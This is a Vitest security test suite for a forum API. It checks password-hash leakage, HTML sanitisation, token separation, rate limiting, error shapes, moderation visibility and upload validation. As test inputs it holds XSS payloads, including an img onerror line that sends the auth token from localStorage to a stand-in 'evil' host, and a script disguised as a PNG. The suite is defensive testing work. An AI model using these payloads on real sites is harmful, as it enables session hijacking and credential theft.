import { beforeAll, afterAll, describe, expect, it } from 'vitest';
import { eq } from 'drizzle-orm';
import { closeDatabase, freshDatabase, json, request, seedUser } from './setup.js';
import { db } from '../src/db/index.js';
import { posts, comments } from '../src/db/schema.js';
import { createRefreshToken, createAccessToken } from '../src/core/security.js';

beforeAll(async () => {
  await freshDatabase();
});
afterAll(async () => {
  await closeDatabase();
});

/** Each test gets its own client IP so the rate limiters stay independent. */
let ipCounter = 0;
const nextIp = () => ({ 'x-forwarded-for': `10.0.${Math.floor(ipCounter / 250)}.${ipCounter++ % 250}` });

describe('password hashes never leave the API', () => {
  it('GET /users/:id does not expose hashed_password', async () => {
    const admin = await seedUser('admin');
    const victim = await seedUser('user');

    const res = await request(`/users/${victim.id}`, { token: admin.token, headers: nextIp() });
    expect(res.status).toBe(200);

    const body = await res.text();
    expect(body).not.toContain('$2b$');
    expect(body).not.toContain('$2a$');
    expect(body).not.toContain('hashed_password');
  });

  it('no endpoint in the surface leaks a bcrypt digest', async () => {
    const admin = await seedUser('admin');
    const author = await seedUser('doctor');

    const created = await request('/posts', {
      method: 'POST',
      token: author.token,
      headers: nextIp(),
      body: json({ title: 'Bài viết kiểm thử', content: '<p>Nội dung đủ dài để hợp lệ.</p>' }),
    });
    const post = await created.json();

    await request(`/posts/${post.id}/comments`, {
      method: 'POST',
      token: author.token,
      headers: nextIp(),
      body: json({ content: 'Bình luận thử' }),
    });

    const surface = [
      '/auth/me',
      '/users',
      `/users/${author.id}`,
      '/posts',
      `/posts/${post.id}`,
      `/posts/${post.id}/comments`,
      `/posts/${post.id}/reactions`,
      '/users/me/bookmarks',
      '/categories',
      '/tags',
      '/tags/hot',
      '/admin/stats',
      '/admin/users',
      '/admin/posts',
      '/admin/moderation/posts',
      '/admin/reports',
    ];

    for (const path of surface) {
      const res = await request(path, { token: admin.token, headers: nextIp() });
      const text = await res.text();
      expect(res.status, `${path} -> ${res.status}`).toBeLessThan(500);
      expect(text, `${path} leaked a bcrypt hash`).not.toMatch(/\$2[aby]\$/);
      expect(text, `${path} leaked the hash column`).not.toContain('hashed_password');
    }
  });
});

describe('stored content is sanitised on write', () => {
  it('strips the script that would run in a moderator session', async () => {
    const attacker = await seedUser('user');

    const res = await request('/posts', {
      method: 'POST',
      token: attacker.token,
      headers: nextIp(),
      body: json({
        title: 'Bài viết bình thường',
        content:
          '<p>Xin chào</p><img src=x onerror="fetch(\'//evil/\'+localStorage.getItem(\'auth-storage\'))"><script>alert(1)</script>',
      }),
    });
    expect(res.status).toBe(201);
    const body = await res.json();

    expect(body.content).not.toContain('onerror');
    expect(body.content).not.toContain('<script');
    expect(body.content).toContain('Xin chào');

    // And the row on disk is clean, not just the response.
    const stored = await db.select().from(posts).where(eq(posts.id, body.id)).limit(1);
    expect(stored[0]!.content).not.toContain('onerror');
    expect(stored[0]!.content).not.toContain('<script');
  });

  it('strips javascript: links and script from comments', async () => {
    const author = await seedUser('doctor');
    const created = await request('/posts', {
      method: 'POST',
      token: author.token,
      headers: nextIp(),
      body: json({ title: 'Chủ đề thảo luận', content: '<p>Nội dung mở đầu.</p>' }),
    });
    const post = await created.json();

    const res = await request(`/posts/${post.id}/comments`, {
      method: 'POST',
      token: author.token,
      headers: nextIp(),
      body: json({ content: '<a href="javascript:alert(1)">bấm</a><script>alert(2)</script>' }),
    });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.content).not.toContain('javascript:');
    expect(body.content).not.toContain('<script');

    const stored = await db.select().from(comments).where(eq(comments.id, body.id)).limit(1);
    expect(stored[0]!.content).not.toContain('javascript:');
  });
});

describe('token separation', () => {
  it('refuses an access token at /auth/refresh', async () => {
    const user = await seedUser('user');
    const accessToken = await createAccessToken(user.id, 'user');

    const res = await request('/auth/refresh', {
      method: 'POST',
      headers: nextIp(),
      body: json({ refresh_token: accessToken }),
    });
    expect(res.status).toBe(401);
    expect((await res.json()).detail).toBe('Invalid refresh token');
  });

  it('accepts a real refresh token at /auth/refresh', async () => {
    const user = await seedUser('user');
    const refreshToken = await createRefreshToken(user.id, 'user');

    const res = await request('/auth/refresh', {
      method: 'POST',
      headers: nextIp(),
      body: json({ refresh_token: refreshToken }),
    });
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.token_type).toBe('bearer');
    expect(body.access_token).toBeTruthy();
  });

  it('refuses a refresh token used as a bearer credential', async () => {
    const user = await seedUser('user');
    const refreshToken = await createRefreshToken(user.id, 'user');

    const res = await request('/auth/me', { token: refreshToken, headers: nextIp() });
    expect(res.status).toBe(401);
  });

  it('rejects a malformed subject instead of crashing', async () => {
    // auth.py:54 passed the raw string subject into a uuid comparison.
    const bogus = await createRefreshToken('not-a-uuid', 'user');
    const res = await request('/auth/refresh', {
      method: 'POST',
      headers: nextIp(),
      body: json({ refresh_token: bogus }),
    });
    expect(res.status).toBe(401);
  });
});

describe('rate limiting', () => {
  it('locks out repeated failed logins from one address', async () => {
    const victim = await seedUser('user');
    const ip = { 'x-forwarded-for': '203.0.113.55' };

    let sawLimit = false;
    for (let i = 0; i < 14; i += 1) {
      const res = await request('/auth/login', {
        method: 'POST',
        headers: ip,
        body: json({ email: victim.email, password: 'wrong-password' }),
      });
      if (res.status === 429) {
        sawLimit = true;
        break;
      }
      expect(res.status).toBe(401);
    }
    expect(sawLimit).toBe(true);
  });
});

describe('error contract the frontend depends on', () => {
  it('returns { detail: string } for handled errors', async () => {
    const res = await request('/posts/khong-ton-tai', { headers: nextIp() });
    expect(res.status).toBe(404);
    const body = await res.json();
    expect(typeof body.detail).toBe('string');
  });

  it('returns Pydantic-shaped 422 for validation failures', async () => {
    const user = await seedUser('user');
    const res = await request('/posts', {
      method: 'POST',
      token: user.token,
      headers: nextIp(),
      body: json({ title: 'x', content: '' }),
    });
    expect(res.status).toBe(422);

    // CreatePostPage.tsx:120-124 reads detail[0].msg when detail is an array.
    const body = await res.json();
    expect(Array.isArray(body.detail)).toBe(true);
    expect(typeof body.detail[0].msg).toBe('string');
    expect(Array.isArray(body.detail[0].loc)).toBe(true);
  });

  it('uses 403, not 401, for a deactivated account so the client does not log out', async () => {
    const { users } = await import('../src/db/schema.js');
    const user = await seedUser('user');
    await db.update(users).set({ is_active: false }).where(eq(users.id, user.id));

    const res = await request('/auth/me', { token: user.token, headers: nextIp() });
    expect(res.status).toBe(403);
  });

  it('uses 403 for an insufficient role', async () => {
    const user = await seedUser('user');
    const res = await request('/admin/stats', { token: user.token, headers: nextIp() });
    expect(res.status).toBe(403);
  });
});

describe('moderation queue is not probeable', () => {
  it('hides a pending post from strangers behind a 404', async () => {
    const author = await seedUser('user');
    const stranger = await seedUser('user');

    const created = await request('/posts', {
      method: 'POST',
      token: author.token,
      headers: nextIp(),
      body: json({ title: 'Bài chờ duyệt', content: '<p>Nội dung chờ kiểm duyệt.</p>' }),
    });
    const post = await created.json();
    expect(post.status).toBe('pending');

    const asStranger = await request(`/posts/${post.id}`, {
      token: stranger.token,
      headers: nextIp(),
    });
    expect(asStranger.status).toBe(404);

    const asAuthor = await request(`/posts/${post.id}`, {
      token: author.token,
      headers: nextIp(),
    });
    expect(asAuthor.status).toBe(200);
  });
});

describe('upload validation', () => {
  it('rejects a script wearing a .png extension', async () => {
    const user = await seedUser('user');
    const form = new FormData();
    form.append(
      'file',
      new File(['<script>alert(1)</script>'], 'payload.png', { type: 'image/png' }),
    );

    const res = await request('/upload', {
      method: 'POST',
      token: user.token,
      headers: nextIp(),
      body: form,
    });
    expect(res.status).toBe(400);
    expect((await res.json()).detail).toContain('Invalid image');
  });

  it('rejects a disallowed extension outright', async () => {
    const user = await seedUser('user');
    const form = new FormData();
    form.append('file', new File(['MZ'], 'payload.exe', { type: 'image/png' }));

    const res = await request('/upload', {
      method: 'POST',
      token: user.token,
      headers: nextIp(),
      body: form,
    });
    expect(res.status).toBe(400);
  });
});
